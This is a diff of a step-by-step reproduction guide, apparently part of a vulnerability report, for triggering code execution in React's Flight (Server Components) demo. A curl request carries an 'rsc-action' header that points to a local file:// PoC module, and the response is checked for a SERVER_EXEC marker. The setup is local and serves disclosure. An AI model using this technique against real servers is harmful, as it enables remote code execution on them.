@@ -1,23 +1,52 @@
 
 
-his document outlines the steps to run the Flight demo and trigger the vulnerable path.
+This document outlines the steps to run the Flight demo and trigger the vulnerable path.
 
-## Step 1: Start the Flight Demo
 
-Open a terminal and start the Flight demo servers:
+## 1. Build + Run The Vulnerable Demo Locally
+
+### Prerequisites
+
+Install the following before proceeding:
+
+1. **Node.js**: Use Node 20.x or 22.x (as specified in the fixture's `package.json`)
+2. **Yarn classic**: Enable and prepare Yarn with the following commands:
+   ```bash
+   corepack enable
+   corepack prepare yarn@1.22.22 --activate
+   ```
+
+### Step 1: Install Dependencies and Build Flight Prerequisites
+
+From the repository root, install dependencies and build the Flight prerequisite artifacts:
+
+```bash
+cd /path/to/react
+yarn install
+yarn build-for-flight-dev
+```
+
+This produces `build/oss-experimental/` which the fixture copies into its `node_modules/`.
+
+### Step 2: Install and Start the Flight Demo Servers
+
+In another terminal, navigate to the Flight fixture directory, install dependencies, and start the servers:
 
 ```bash
 cd /path/to/react/fixtures/flight
+yarn install
 yarn dev
 ```
 
-This should start:
-- Global server on localhost (port 3000)
-- Regional server on localhost (port 3001)
+Wait until you see logs indicating:
+- **Global server** on `http://localhost:3000`
+- **Regional server** on `http://localhost:3001`
 
-## Step 2: Create a PoC Module
+## 2. Exploit the Vulnerability
 
-In a second terminal, create the proof-of-concept module:
+### Step 3: Create a PoC Module
+
+In a second terminal (separate from the server terminal), create the proof-of-concept module:
 
 ```bash
 cat > /tmp/rsc_poc.mjs <<'EOF'
@@ -32,9 +61,9 @@ pwn.$$typeof = Symbol.for("react.server.reference");
 EOF
 ```
 
-## Step 3: Trigger the Vulnerable Path
+### Step 4: Trigger the Vulnerable Path
 
-In the same terminal as Step 2, execute the following curl command:
+In the same terminal as Step 3, execute the following curl command:
 
 ```bash
 curl -sS 'http://localhost:3000/' \
@@ -44,6 +73,7 @@ curl -sS 'http://localhost:3000/' \
   -H 'rsc-action: file:///tmp/rsc_poc.mjs#pwn' \
   --data '[]' | strings | grep -F 'SERVER_EXEC'
 ```
+
 
 
 My terminal Output:
